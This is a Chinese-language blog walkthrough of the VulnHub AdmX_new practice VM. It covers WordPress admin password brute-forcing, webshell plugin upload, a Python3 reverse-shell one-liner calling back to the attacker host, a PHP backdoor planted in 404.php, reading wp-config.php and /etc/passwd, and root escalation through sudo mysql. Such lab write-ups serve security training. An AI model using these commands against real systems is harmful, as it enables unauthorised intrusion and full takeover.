@@ -1,0 +1,236 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> VulnHub-4-AdmX_new · Patrik's Blog</title><meta name="description" content="VulnHub-4-AdmX_new - Patrik"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Patrik's Blog"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Patrik's Blog" type="application/atom+xml">
+</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://www.bing.com" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/byesec" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">VulnHub-4-AdmX_new</h1><div class="post-info">2022年4月12日</div><div class="post-content"><blockquote>
+<p>靶机地址: <a target="_blank" rel="noopener" href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a><br>难度等级: 中<br>打靶目标: 取得 2 个 flag + root 权限</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117091346386.png" alt="image-20211117091346386"></p>
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.11</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117091944645.png" alt="image-20211117091944645"></p>
+<h3 id="3-端口服务信息扫描"><a href="#3-端口服务信息扫描" class="headerlink" title="3.端口服务信息扫描"></a>3.端口服务信息扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p80 10.0.2.11</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117092313209.png" alt="image-20211117092313209"></p>
+<h3 id="4-访问10-0-2-11的80端口页面"><a href="#4-访问10-0-2-11的80端口页面" class="headerlink" title="4.访问10.0.2.11的80端口页面"></a>4.访问10.0.2.11的80端口页面</h3><p>访问：10.0.2.11:80</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117092452624.png" alt="image-20211117092452624"></p>
+<p>是Apache在Ubuntu下的默认页面，没有能够利用的信息</p>
+<h3 id="5-使用feroxbuster目录扫描"><a href="#5-使用feroxbuster目录扫描" class="headerlink" title="5.使用feroxbuster目录扫描"></a>5.使用feroxbuster目录扫描</h3><p>（字典：sudo apt install seclist   较大）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.11 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>扫描部分结果如下：</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117093525296.png" alt="image-20211117093525296"></p>
+<h3 id="6-访问可疑目录"><a href="#6-访问可疑目录" class="headerlink" title="6.访问可疑目录"></a>6.访问可疑目录</h3><p>访问<a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/">http://10.0.2.11/wordpress/</a></p>
+<p>载入页面的过程长达5分钟，只能显示页面的部分信息，且一直处于加载中状态</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117100907047.png" alt="image-20211117100907047"></p>
+<p>思考：一个WordPress的站点，究竟在访问过程中加载了什么？使得加载过程如此缓慢？</p>
+<h3 id="7-使用Burpsuite对访问页面的流量进行分析"><a href="#7-使用Burpsuite对访问页面的流量进行分析" class="headerlink" title="7.使用Burpsuite对访问页面的流量进行分析"></a>7.使用Burpsuite对访问页面的流量进行分析</h3><p>配置代理–OFF–访问<a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/">http://10.0.2.11/wordpress/</a> –HTTP history</p>
+<p>发现在访问<a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E9%A1%B5%E9%9D%A2%E5%9C%A8%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82%E6%97%B6%E8%BF%98%E4%BC%9A%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80192.168.159.145">http://10.0.2.11/wordpress/的过程中，页面在资源请求时还会访问地址192.168.159.145</a></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117103351121.png" alt="image-20211117103351121"></p>
+<p>对页面返回的响应结果进行筛选过滤192.168.159.145</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117104819274.png" alt="image-20211117104819274"></p>
+<p>发现存在默认访问该IP的硬编码写入</p>
+<p>使用Burpsuite–Proxy–Match and Replace–Add–配置</p>
+<p>作用：将响应头部中和响应体内的192.168.159.145强制替换为10.0.2.11</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113559581.png" alt="image-20211117113559581"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113614462.png" alt="image-20211117113614462"></p>
+<p>重新访问页面</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117105003629.png" alt="image-20211117105003629"></p>
+<p>发现访问顺畅迅速，且加载了之前没能加载到的前端JS脚本，即页面加载成功。</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117110643947.png" alt="image-20211117110643947"></p>
+<h2 id="二、漏洞挖掘"><a href="#二、漏洞挖掘" class="headerlink" title="二、漏洞挖掘"></a>二、漏洞挖掘</h2><h3 id="1-对页面里的链接和表单提交等位置尝试检测"><a href="#1-对页面里的链接和表单提交等位置尝试检测" class="headerlink" title="1.对页面里的链接和表单提交等位置尝试检测"></a>1.对页面里的链接和表单提交等位置尝试检测</h3><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117105845151.png" alt="image-20211117105845151"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117110717572.png" alt="image-20211117110717572"></p>
+<p>并未发现直接漏洞</p>
+<h3 id="2-对WordPress版本的漏洞进行查找"><a href="#2-对WordPress版本的漏洞进行查找" class="headerlink" title="2.对WordPress版本的漏洞进行查找"></a>2.对WordPress版本的漏洞进行查找</h3><p>并未发现直接可利用漏洞（代码执行等）</p>
+<h3 id="3-返回查看目录扫描结果"><a href="#3-返回查看目录扫描结果" class="headerlink" title="3.返回查看目录扫描结果"></a>3.返回查看目录扫描结果</h3><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117105722251.png" alt="image-20211117105722251"></p>
+<p>发现疑似管理后台路径，尝试访问<a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/wp-admin">http://10.0.2.11/wordpress/wp-admin</a></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113657009.png" alt="image-20211117113657009"></p>
+<p>确实是WordPress的管理后台，查询获得WordPress默认账号为admin，尝试弱口令后无果</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113731381.png" alt="image-20211117113731381"></p>
+<h3 id="4-对管理页面进行密码爆破"><a href="#4-对管理页面进行密码爆破" class="headerlink" title="4.对管理页面进行密码爆破"></a>4.对管理页面进行密码爆破</h3><p>根据长度筛选出 请求密码为adam14时发生了重定向</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141137210.png" alt="image-20211117141137210"></p>
+<p>分析响应头中，重定向到<a target="_blank" rel="noopener" href="http://192.168.159.145/wordpress/wp-admin/">http://192.168.159.145/wordpress/wp-admin/</a></p>
+<p>且有服务端分配给访问者的cookie</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141215930.png" alt="image-20211117141215930"></p>
+<p>登录WordPress后台，WordPress版本为5.7.1</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141334010.png" alt="image-20211117141334010"></p>
+<h3 id="5-WordPress后台漏洞利用"><a href="#5-WordPress后台漏洞利用" class="headerlink" title="5.WordPress后台漏洞利用"></a>5.WordPress后台漏洞利用</h3><h4 id="5-1尝试在“主题”插入一句话木马连接蚁剑"><a href="#5-1尝试在“主题”插入一句话木马连接蚁剑" class="headerlink" title="5.1尝试在“主题”插入一句话木马连接蚁剑"></a>5.1尝试在“主题”插入一句话木马连接蚁剑</h4><p>Appearance–Theme Editor–404.php</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141839492.png" alt="image-20211117141839492"></p>
+<p>上传失败</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141931382.png" alt="image-20211117141931382"></p>
+<h4 id="5-2利用插件上传webshell"><a href="#5-2利用插件上传webshell" class="headerlink" title="5.2利用插件上传webshell"></a>5.2利用插件上传webshell</h4><h5 id="5-2-1上传实现反弹shell连接"><a href="#5-2-1上传实现反弹shell连接" class="headerlink" title="5.2.1上传实现反弹shell连接"></a>5.2.1上传实现反弹shell连接</h5><p>本地写一个简单的插件（符合WordPress标准的）</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142333540.png" alt="image-20211117142333540"></p>
+<p>Plugins–Add–Upload Plugins</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142059793.png" alt="image-20211117142059793"></p>
+<p>并压缩为可上传格式</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142554942.png" alt="image-20211117142554942"></p>
+<p>上传、激活</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142630478.png" alt="image-20211117142630478"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142653949.png" alt="image-20211117142653949"></p>
+<p>插件默认路径为：</p>
+<p><a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/wp-content/plugins/shell.php">http://10.0.2.11/wordpress/wp-content/plugins/shell.php</a></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142901551.png" alt="image-20211117142901551"></p>
+<p>尝试执行id命令：</p>
+<p><a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id">http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id</a></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117143020914.png" alt="image-20211117143020914"></p>
+<p>确定了webshell上传成功，且可执行操作系统命令</p>
+<h5 id="5-2-2-确认目标靶机上可利用的信息-x2F-软件"><a href="#5-2-2-确认目标靶机上可利用的信息-x2F-软件" class="headerlink" title="5.2.2 确认目标靶机上可利用的信息&#x2F;软件"></a>5.2.2 确认目标靶机上可利用的信息&#x2F;软件</h5><h6 id="Kali监听4444端口"><a href="#Kali监听4444端口" class="headerlink" title="Kali监听4444端口"></a>Kali监听4444端口</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117143051516.png" alt="image-20211117143051516"></p>
+<h6 id="确定目标靶机是否有nc"><a href="#确定目标靶机是否有nc" class="headerlink" title="确定目标靶机是否有nc"></a>确定目标靶机是否有nc</h6><p>（存在，但本次尝试其他方法）</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117143209631.png" alt="image-20211117143209631"></p>
+<h6 id="确定目标靶机是否有Python环境"><a href="#确定目标靶机是否有Python环境" class="headerlink" title="确定目标靶机是否有Python环境"></a>确定目标靶机是否有Python环境</h6><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144310167.png" alt="image-20211117144310167"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144328196.png" alt="image-20211117144328196"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144402379.png" alt="image-20211117144402379"></p>
+<p>目标靶机存在Python3环境</p>
+<h5 id="5-2-3使用python3反弹shell代码"><a href="#5-2-3使用python3反弹shell代码" class="headerlink" title="5.2.3使用python3反弹shell代码"></a>5.2.3使用python3反弹shell代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145344122.png" alt="image-20211117145344122"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145402436.png" alt="image-20211117145402436"></p>
+<p>使用msf 寻找可利用的wordpress exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfdb run</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search wordpress admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144658121.png" alt="image-20211117144658121"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145600950.png" alt="image-20211117145600950"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PASSWORD adam14</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 10.0.2.11</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set TARGETURI /wordpress</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set USERNAME admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145845194.png" alt="image-20211117145845194"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150025521.png" alt="image-20211117150025521"></p>
+<p>缺点：有些命令不能成功显示</p>
+<h4 id="5-3再次尝试在“主题”插入一句话木马"><a href="#5-3再次尝试在“主题”插入一句话木马" class="headerlink" title="5.3再次尝试在“主题”插入一句话木马"></a>5.3再次尝试在“主题”插入一句话木马</h4><p>回顾之前在Web页面插入一句话木马修改404.php模板失败，那在现已经获得命令行shell的前提下，是否可以尝试手动的添加一句话？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd wp-content</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd themes</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150443652.png" alt="image-20211117150443652"></p>
+<p>再结合页面信息，确定当前主题名为twentytwentyone（404.php在其目录下）</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150649101.png" alt="image-20211117150649101"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd twentytwentyone</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150806467.png" alt="image-20211117150806467"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 404.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117150904611.png" alt="image-20211117150904611"></p>
+<p>试图移动光标发现webshell在交互过程中仍存在不足</p>
+<p>升级webshell（只适用于bash）(此处是第二次复现整理的WP所以未再次退回环境重新截图，请参考代码文字即可)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+Z</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg #返回之前的连接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p>因为kali是zsh，故要切换为bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /bin/bash  #确定是否有bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh -s /bin/bash #更改root用户</span><br><span class="line">chsh -s /bin/bash #更改kali用户</span><br><span class="line">（根据需要选择）</span><br></pre></td></tr></table></figure>
+
+<p>重启后进行确认并监听</p>
+<p>准备重新连接shell</p>
+<p>连接成功</p>
+<p>升级webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+Z</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg #返回之前的连接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELL=/bin/bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM=screen</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty rows 38 columns 116</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+<p>（升级成功 可Tab补全）调小字体后</p>
+<p>在404.php中写入一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117152444377.png" alt="image-20211117152444377"></p>
+<p>保存后打开蚁剑进行配置以维持权限稳定</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shell:http://10.0.2.11/wordpress/wp-content/themes/twentytwentyone/404.php</span><br><span class="line"></span><br><span class="line">pwd:aa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117152943835.png" alt="image-20211117152943835"></p>
+<p>成功连接</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117153006539.png" alt="image-20211117153006539"></p>
+<h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><h3 id="1-查看-x2F-etc-x2F-passwd"><a href="#1-查看-x2F-etc-x2F-passwd" class="headerlink" title="1.查看&#x2F;etc&#x2F;passwd"></a>1.查看&#x2F;etc&#x2F;passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117153735618.png" alt="image-20211117153735618"></p>
+<h3 id="2-查看主目录文件内是否有该用户"><a href="#2-查看主目录文件内是否有该用户" class="headerlink" title="2.查看主目录文件内是否有该用户"></a>2.查看主目录文件内是否有该用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /home/wpadmin/ -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117153914865.png" alt="image-20211117153914865"></p>
+<p>发现存在local.txt文件，只有wpadmin用户对其有读的权限</p>
+<h3 id="3-查看操作系统内核"><a href="#3-查看操作系统内核" class="headerlink" title="3.查看操作系统内核"></a>3.查看操作系统内核</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p>失败</p>
+<h3 id="4-尝试查看当前用户有没有sudo权限"><a href="#4-尝试查看当前用户有没有sudo权限" class="headerlink" title="4.尝试查看当前用户有没有sudo权限"></a>4.尝试查看当前用户有没有sudo权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>失败</p>
+<h3 id="5-查看WordPress的配置文件"><a href="#5-查看WordPress的配置文件" class="headerlink" title="5.查看WordPress的配置文件"></a>5.查看WordPress的配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/wordpress/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat wp-config.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154514825.png" alt="image-20211117154514825"></p>
+<h3 id="6-是否有密码复用的可能性"><a href="#6-是否有密码复用的可能性" class="headerlink" title="6.是否有密码复用的可能性?"></a>6.是否有密码复用的可能性?</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ww-data@wp:/var/www/html/wordpress$ su wpadmin</span><br><span class="line">Password: </span><br><span class="line">su: Authentication failure</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154640760.png" alt="image-20211117154640760"></p>
+<p>失败</p>
+<h3 id="7-尝试登录数据库账号"><a href="#7-尝试登录数据库账号" class="headerlink" title="7.尝试登录数据库账号"></a>7.尝试登录数据库账号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u admin -p Wp_Admin#123 -D wordpress</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154804076.png" alt="image-20211117154804076">失败</p>
+<h3 id="8-尝试是否复用了Web页面的密码"><a href="#8-尝试是否复用了Web页面的密码" class="headerlink" title="8.尝试是否复用了Web页面的密码"></a>8.尝试是否复用了Web页面的密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su wpadmin</span><br></pre></td></tr></table></figure>
+
+<p>尝试输入密码adam14</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154929085.png" alt="image-20211117154929085"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat local.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155043263.png" alt="image-20211117155043263"></p>
+<p>flag1:153495edec1b606c24947b1335998bd9</p>
+<h3 id="9-二次提权"><a href="#9-二次提权" class="headerlink" title="9.二次提权"></a>9.二次提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>提示可以执行的命令：</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155135536.png" alt="image-20211117155135536"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p    #输入密码adam14</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155339940.png" alt="image-20211117155339940"></p>
+<p>成功登录数据库</p>
+<h3 id="10-利用mysql数据库特性"><a href="#10-利用mysql数据库特性" class="headerlink" title="10.利用mysql数据库特性"></a>10.利用mysql数据库特性</h3><p>当前启动的数据库进程是具有root权限的，结合mysql数据库 system 命令 的功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system id </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155440756.png" alt="image-20211117155440756"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\! /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155507429.png" alt="image-20211117155507429"></p>
+<p>成功获取root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat proof.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155542610.png" alt="image-20211117155542610"></p>
+<p>flag2:7efd721c8bfff2937c66235f2d0dbac1</p>
